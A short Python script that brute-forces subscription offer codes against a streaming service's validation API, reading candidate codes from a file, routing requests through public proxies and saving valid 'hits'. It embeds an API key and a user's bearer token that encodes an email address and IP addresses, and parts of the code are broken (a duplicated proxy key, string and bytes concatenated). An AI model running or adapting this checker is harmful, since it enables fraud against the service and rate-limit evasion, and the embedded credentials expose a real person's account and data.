import requests
#import sleep
proxies = {
"http": "103.48.68.106:83",
"http": "103.210.57.243:80"
}
from requests.structures import CaseInsensitiveDict
i = open("code.txt").read().splitlines()
#cd = cd.splitlines().strip()
#cd = ccd.splitlines().strip()
#cd = [list.strip() for list in ccd]
for cd in i:
	#cd = open("code.txt", "r").read().splitlines()
	url = "https://prod-api.viewlift.com/subscription/offer/validate?site=hoichoitv"
	cok = {
	"Authorization" : "",
	"x-api-key" : "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef",
	"Content-Type" : "application/json",
	"Origin" : "https://www.hoichoi.tv"
	}
	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/json"
	headers["Authorization"] = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI4NmFkYjBlMC0wMzY3LTRmNjQtOWRiNy0wZGRmODQzZGVhYzUiLCJzaXRlIjoiaG9pY2hvaXR2Iiwic2l0ZUlkIjoiN2ZhMGVhOWEtOTc5OS00NDE3LTk5ZjUtY2JiNTM0M2M1NTFkIiwiZW1haWwiOiJiaXBsb2JoYXNhbjIwNzBAZ21haWwuY29tIiwiaXBhZGRyZXNzZXMiOiIxMDMuNTUuMjQyLjIzMywgMTAuMTIwLjQuMCwgNTQuMjI0LjEyOC4yMDIsIDEzMC4xNzYuOTguMTQ4IiwiY291bnRyeUNvZGUiOiJCRCIsInBvc3RhbGNvZGUiOiI2NDAwIiwicHJvdmlkZXIiOiJ2aWV3bGlmdCIsImRldmljZUlkIjoiYnJvd3Nlci1iNGJhN2FlMi1kODEwLWMyMzUtMWYyYS0zZWQ5NzYyYTQ0N2MiLCJpZCI6Ijg2YWRiMGUwLTAzNjctNGY2NC05ZGI3LTBkZGY4NDNkZWFjNSIsImlhdCI6MTY5MzQ0OTExOSwiZXhwIjoxNjk0MDUzOTE5fQ.Ddv4VmBiVGcc5cx7dzSWx7VtPgzGsUyCcCoDOkNb4hg"
	headers["x-api-key"] = "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
	data = '{"offerCode":"'+cd+'"}'
	#print data
	#requests.get("https://prod-api.viewlift.com/subscription/offer/validate?site=hoichoitv")
	resp = requests.post(url, headers=headers, data=data, cookies=cok, proxies=proxies)
	print('CHECKING >> ' + cd + resp.content + "\n")
	if "Code is Valid" in resp.content:
		open('hits.txt', 'a').write(cd+'\n')
